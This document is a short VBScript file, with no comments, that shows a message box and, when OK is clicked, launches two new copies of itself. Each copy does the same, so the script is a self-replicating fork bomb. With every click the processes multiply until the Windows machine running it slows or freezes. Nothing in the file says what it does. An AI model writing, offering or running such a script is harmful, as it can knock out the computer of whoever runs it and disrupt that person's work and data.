Set objShell = CreateObject("WScript.Shell")

response = MsgBox("This is the first message box.", vbOKOnly, "Message 1")

If response = vbOK Then
    objShell.Run "wscript " & WScript.ScriptFullName
    objShell.Run "wscript " & WScript.ScriptFullName
End If
